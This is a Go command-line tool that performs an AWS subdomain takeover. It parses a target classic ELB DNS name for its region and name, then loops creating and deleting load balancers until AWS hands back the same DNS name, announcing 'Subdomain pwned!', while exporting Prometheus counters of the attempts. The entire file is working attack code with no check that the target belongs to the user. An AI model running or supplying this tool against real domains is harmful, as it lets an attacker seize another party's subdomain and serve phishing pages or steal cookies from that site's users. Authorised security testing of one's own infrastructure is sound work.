package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"regexp"
	"time"

	// AWS libraries
	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/awserr"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/elb"

	// Custom metrics require prom libraries
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promauto"
	"github.com/prometheus/client_golang/prometheus/promhttp"
)

func main() {
	// serve metrics on 2112
	http.Handle("/metrics", promhttp.Handler())
	go func() {
		http.ListenAndServe(":2112", nil)
	}()
	// Declaring different metrics
	// Total number of ELBs created
	var (
		elbCreated = promauto.NewCounter(prometheus.CounterOpts{
			Name: "elb_subdomain_taker_elbs_created_total",
			Help: "The total number of ELBs created",
		})
	)
	// Total number of ELBs deleted
	var (
		elbDeleted = promauto.NewCounter(prometheus.CounterOpts{
			Name: "elb_subdomain_taker_elbs_deleted_total",
			Help: "The total number of ELBs deleted",
		})
	)

	// CLI flags
	elbPtr := flag.String("elb", "", "the elb to take over - myelb-1234.elb.amazonaws.com")
	// Parse flags
	flag.Parse()
	if *elbPtr == "" {
		log.Fatal("You have to Specify the ELB")
	}
	// We're using `MustCompile` so we fail hard if something's wrong with the regex
	/*
	   Define regex to match the "random" part of the ELB
	   This will match any random string between 6 and 10 digits enclosed between `-` and `.`
	*/
	reNum := regexp.MustCompile(`-(\d{6,10})\.`)
	// Get the "random" number from the elb
	NumToFind := string(reNum.FindStringSubmatch(*elbPtr)[1])

	fmt.Println(NumToFind)

	/* All AWS Regions we're matching
	us-east-2
	us-east-1
	us-west-1
	us-west-2
	ap-east-1
	ap-south-1
	ap-northeast-2
	ap-southeast-1
	ap-southeast-2
	ap-northeast-1
	ca-central-1
	cn-north-1
	cn-northwest-1
	eu-central-1
	eu-west-1
	eu-west-2
	eu-west-3
	eu-north-1
	sa-east-1
	us-gov-east-1
	*/
	// Define the regex to match the region
	reRegion := regexp.MustCompile(`(us(-gov)?|ap|ca|cn|eu|sa)-(central|(north|south)?(east|west)?)-\d`)
	// Get the region of the ELB
	elbRegion := string(reRegion.FindStringSubmatch(*elbPtr)[0])

	fmt.Println(elbRegion)

	// Get the "name" of the ELB that we'll be using to create new ELBs
	// Define the regex
	reName := regexp.MustCompile(`^(.*)-\d{6,10}\.`)
	// Get the name
	elbName := string(reName.FindStringSubmatch(*elbPtr)[1])

	fmt.Println(elbName)

	// Now that we have what we're looking for, let's start to create ELBs

	// Initialise AWS session including the region we extracted from the ELB
	sess, err := session.NewSession(&aws.Config{
		Region: aws.String(elbRegion)},
	)
	if err != nil {
		log.Fatal("Could not initiate session")
	}

	// Create ELB service client
	svc := elb.New(sess)

	// Loop through creation until we found it
	for {
		// initialise empty var so we can loop
		result := &elb.CreateLoadBalancerOutput{}
		// Now start to create a new ELB
		// reference: https://docs.aws.amazon.com/sdk-for-go/api/service/elb/#ELB.CreateLoadBalancer
		fmt.Println("Creating ELB")
		input := &elb.CreateLoadBalancerInput{
			AvailabilityZones: []*string{
				aws.String(elbRegion + "a"),
			},
			Listeners: []*elb.Listener{
				{
					InstancePort:     aws.Int64(80),
					InstanceProtocol: aws.String("HTTP"),
					LoadBalancerPort: aws.Int64(80),
					Protocol:         aws.String("HTTP"),
				},
			},
			LoadBalancerName: aws.String(elbName),
		}

		result, err := svc.CreateLoadBalancer(input)
		if err != nil {
			if aerr, ok := err.(awserr.Error); ok {
				switch aerr.Code() {
				case elb.ErrCodeDuplicateAccessPointNameException:
					fmt.Println(elb.ErrCodeDuplicateAccessPointNameException, aerr.Error())
				case elb.ErrCodeTooManyAccessPointsException:
					fmt.Println(elb.ErrCodeTooManyAccessPointsException, aerr.Error())
				case elb.ErrCodeCertificateNotFoundException:
					fmt.Println(elb.ErrCodeCertificateNotFoundException, aerr.Error())
				case elb.ErrCodeInvalidConfigurationRequestException:
					fmt.Println(elb.ErrCodeInvalidConfigurationRequestException, aerr.Error())
				case elb.ErrCodeSubnetNotFoundException:
					fmt.Println(elb.ErrCodeSubnetNotFoundException, aerr.Error())
				case elb.ErrCodeInvalidSubnetException:
					fmt.Println(elb.ErrCodeInvalidSubnetException, aerr.Error())
				case elb.ErrCodeInvalidSecurityGroupException:
					fmt.Println(elb.ErrCodeInvalidSecurityGroupException, aerr.Error())
				case elb.ErrCodeInvalidSchemeException:
					fmt.Println(elb.ErrCodeInvalidSchemeException, aerr.Error())
				case elb.ErrCodeTooManyTagsException:
					fmt.Println(elb.ErrCodeTooManyTagsException, aerr.Error())
				case elb.ErrCodeDuplicateTagKeysException:
					fmt.Println(elb.ErrCodeDuplicateTagKeysException, aerr.Error())
				case elb.ErrCodeUnsupportedProtocolException:
					fmt.Println(elb.ErrCodeUnsupportedProtocolException, aerr.Error())
				case elb.ErrCodeOperationNotPermittedException:
					fmt.Println(elb.ErrCodeOperationNotPermittedException, aerr.Error())
				default:
					fmt.Println(aerr.Error())
				}
			} else {
				// Print the error, cast err to awserr.Error to get the Code and
				// Message from an error.
				fmt.Println(err.Error())
			}
			return
		}
		// Increase elbCreated counter
		elbCreated.Inc()
		fmt.Println(result)
		if *result.DNSName == *elbPtr {
			fmt.Println("Found match!")
			fmt.Println("ELB created!")
			fmt.Println("Subdomain pwned!")
			break
		}
		// if we have an ELB at this point, we need to delete it to not pile them up
		if *result.DNSName != "" {
			fmt.Println("Deleting current ELB:" + *result.DNSName)
			input := &elb.DeleteLoadBalancerInput{
				LoadBalancerName: aws.String(elbName),
			}

			_, err := svc.DeleteLoadBalancer(input)
			if err != nil {
				if aerr, ok := err.(awserr.Error); ok {
					switch aerr.Code() {
					default:
						fmt.Println(aerr.Error())
					}
				} else {
					// Print the error, cast err to awserr.Error to get the Code and
					// Message from an error.
					fmt.Println(err.Error())
				}
				return
			}
			// Increase elbDeleted counter
			elbDeleted.Inc()
			fmt.Println("Deleted existing ELB successfully")
		}
		fmt.Println("Sleeping before we try again to avoid the rate limit")
		time.Sleep(2000 * time.Millisecond)
		fmt.Println("Next try")
	}
	fmt.Println("Found match!")
	fmt.Println("ELB created!")
	fmt.Println("Subdomain pwned!")

}
